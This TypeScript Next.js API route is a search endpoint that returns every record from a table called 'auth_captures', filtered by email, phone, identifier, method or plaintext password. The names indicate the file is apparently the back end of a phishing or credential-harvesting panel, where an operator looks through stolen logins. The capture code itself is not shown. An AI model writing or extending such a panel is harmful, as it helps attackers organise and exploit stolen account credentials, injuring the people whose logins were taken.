import type { NextApiRequest, NextApiResponse } from "next";
import { getSupabaseServer, ensureDbReady } from "../../lib/supabaseServer";
import { authenticateRequest } from "../../lib/auth";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");

  try {
    await ensureDbReady();
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : "Database initialization failed";
    return res.status(500).json({ error: msg });
  }

  const auth = await authenticateRequest(req);
  if (!auth) {
    return res.status(401).json({ error: "Unauthorized or session replaced", sessionInvalidated: true });
  }

  if (req.method !== "GET") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const supabase = getSupabaseServer();
  const q = String(req.query.q || "").trim().toLowerCase();
  const field = String(req.query.field || "all");

  const { data: captures, error } = await supabase
    .from("auth_captures")
    .select("*")
    .order("created_at", { ascending: false });

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  const filtered = (captures || []).filter((cap) => {
    if (!q) return true;

    if (field === "email") return (cap.email || "").toLowerCase().includes(q);
    if (field === "phone") return (cap.phone || "").toLowerCase().includes(q);
    if (field === "password") return (cap.password || "").toLowerCase().includes(q);

    return (
      (cap.email || "").toLowerCase().includes(q) ||
      (cap.phone || "").toLowerCase().includes(q) ||
      (cap.identifier || "").toLowerCase().includes(q) ||
      (cap.password || "").toLowerCase().includes(q) ||
      (cap.type || "").toLowerCase().includes(q) ||
      (cap.method || "").toLowerCase().includes(q) ||
      String(cap.id || "").toLowerCase().includes(q)
    );
  });

  return res.status(200).json({ captures: filtered });
}
